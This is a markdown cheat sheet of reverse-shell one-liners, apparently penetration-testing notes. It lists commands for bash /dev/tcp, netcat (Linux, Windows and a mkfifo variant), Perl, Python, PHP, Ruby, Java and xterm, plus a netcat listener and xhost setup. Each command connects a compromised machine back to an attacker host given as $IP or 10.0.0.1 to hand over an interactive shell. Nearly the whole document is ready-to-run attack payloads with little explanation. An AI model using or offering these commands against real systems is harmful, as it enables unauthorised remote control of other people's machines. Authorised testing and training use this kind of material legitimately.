# Reverse Shell

- [Reverse Shell](#reverse-shell)
  - [Listner](#listner)
  - [Bash](#bash)
  - [Netcat](#netcat)
    - [Linux](#linux)
    - [Windows](#windows)
  - [Perl](#perl)
  - [Python](#python)
  - [PHP](#php)
  - [Ruby](#ruby)
  - [Java](#java)
  - [xterm](#xterm)

## Listner

---

```bash
 nc -nvlp $PORt
```

## Bash

---

```bash
bash -i >& /dev/tcp/$IP/$PORT 0>&1
```

## Netcat

---
### Linux

```bash
nc -nv $IP $PORT -e /bin/bash
```

### Windows

```bash
nc.exe -nv $IP $PORT -e cmd
```

Incase, you have different version of netcat:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

## Perl

---

```bash
perl -e 'use Socket;$i="$IP";$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S ,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec(" /bin/bash -i");};'
```

## Python

---

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## PHP

---

```bash
php -r '$sock=fsockopen("$IP",$PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Ruby

---

```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Java

---

```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## xterm

One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port `6001`.

```bash
xterm -display 10.0.0.1:1
```

To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):

```bash
Xnest :1
```

You’ll need to authorise the target to connect to you (command also run on your host):

```bash
xhost +targetip
```
